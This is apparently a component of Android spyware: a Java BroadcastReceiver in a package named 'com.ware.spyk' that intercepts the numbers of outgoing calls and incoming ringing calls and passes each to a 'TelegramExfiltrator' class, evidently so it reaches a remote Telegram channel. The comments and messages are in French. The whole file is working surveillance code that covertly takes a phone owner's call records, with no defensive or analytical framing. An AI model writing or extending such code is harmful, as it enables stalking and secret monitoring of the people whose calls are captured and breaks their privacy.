package com.ware.spyk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "CallReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null) return;

        switch (intent.getAction()) {
            case Intent.ACTION_NEW_OUTGOING_CALL:
                String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                Log.d(TAG, "Appel sortant vers : " + outgoingNumber);
                TelegramExfiltrator.sendTexte("📤 Appel sortant : " + outgoingNumber);
                break;

            case TelephonyManager.ACTION_PHONE_STATE_CHANGED:
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                    String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                    Log.d(TAG, "Appel entrant de : " + incomingNumber);
                    TelegramExfiltrator.sendTexte("📥 Appel entrant : " + incomingNumber);
                }
                break;
        }
    }
}
